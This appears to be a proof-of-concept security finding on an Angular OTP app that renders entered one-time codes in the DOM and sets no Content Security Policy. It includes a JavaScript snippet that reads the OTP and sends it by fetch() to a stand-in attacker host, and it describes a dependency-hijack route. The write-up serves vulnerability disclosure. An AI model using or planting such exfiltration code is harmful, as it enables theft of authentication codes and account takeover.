PoC: CSP-less OTP Exfiltration (Chain 1)

Validates that OTP value is exposed in DOM and no CSP blocks exfiltration.

VULNERABLE: OTP displayed in plain text + No CSP = OTP can be silently exfiltrated by any injected script.

Proof 1: OTP Value in DOM

The compiled JavaScript contains the status text interpolation:

statusText=Vr(()=>{let t=this.digits().join("");
  return t.length===this.digitCount()?`OTP entered: ${t}`:""})

This renders <p class="otp-status">OTP entered: 123456</p> in the DOM when all 6 digits are entered. Any script with DOM access can read it.

Proof 2: No Content Security Policy

Built index.html lacks any CSP meta tag or HTTP header:

grep -i "Content-Security-Policy" dist/hero-otp-app/browser/index.html
(no output — CSP is absent)

Without CSP, connect-src defaults to *, allowing any script to make network requests to any destination.

Proof 3: Simulated Exfiltration Script

Run this in browser DevTools on the running OTP app after entering an OTP:

// Step 1: Read OTP from status banner
const otpElement = document.querySelector('.otp-status');
const otpValue = otpElement?.textContent?.match(/\d{6}/)?.[0];

// Step 2: Exfiltrate via fetch (unrestricted by CSP)
if (otpValue) {
  fetch('https://attacker-controlled.com/steal?otp=' + otpValue);
  console.log('[SIMULATED EXFIL] OTP sent to attacker:', otpValue);
} else {
  console.log('Enter all 6 OTP digits first');
}

In a real attack, this code would be injected via a compromised dependency, CDN script, or browser extension.

Reproduction Steps

  1. Serve the app: cd hero-otp-app && ng serve
  2. Open in browser, enter 6 digits in the OTP field
  3. Open DevTools (F12) → Console tab
  4. Paste and run the simulated exfiltration script above
  5. Observe the OTP is read from the DOM and would be sent to an attacker

Additional Attack Vector: Dependency Hijack

@heroui/input-otp is listed in package.json (v2.1.32) but never imported. It's a React component with these peer deps:

"peerDependencies": {
  "react": ">=18",
  "react-dom": ">=18"
}

An attacker who compromises this package (or its transitive deps @react-aria/form, input-otp, etc.) gains full DOM access with no CSP restriction.

This PoC validates that the OTP is readable from DOM and no CSP prevents exfiltration.
